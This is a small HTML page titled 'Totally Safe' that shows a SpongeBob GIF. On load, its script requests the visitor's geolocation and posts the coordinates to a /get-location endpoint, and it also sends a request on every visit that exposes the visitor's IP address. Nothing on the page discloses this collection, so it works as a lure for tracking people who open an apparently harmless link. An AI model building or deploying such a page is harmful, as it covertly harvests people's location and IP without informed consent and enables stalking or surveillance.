<!DOCTYPE html>
<html>

<head>
  <title>Totally Safe</title>
</head>

<body onload="getLocation()">

  <iframe src="https://giphy.com/embed/Lz9CTF7m9lr8Y" width="480" height="221" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
  <p><a href="https://giphy.com/gifs/spongebob-squarepants-funny-dancing-Lz9CTF7m9lr8Y">via GIPHY</a></p>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, getIP());
      } else {
        // getIP();
      }
    }

    function getIP() {

      fetch("/get-location", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({})
      })
        .then(response => response.text())
        .then(message => {console.log(message);})
        .catch(err => {
          console.error("Error: ", err);
        });

    }

    function showPosition(position) {

      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
  
      const data = {
        latitude: latitude,
        longitude: longitude,
      };

      fetch("/get-location", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data),
      })
        .then((response) => response.text())
        .then((message) => {console.log(message)})
        .catch((err) => {
          console.error("Error:", err);
        });

    }
</script>

</body>
</html>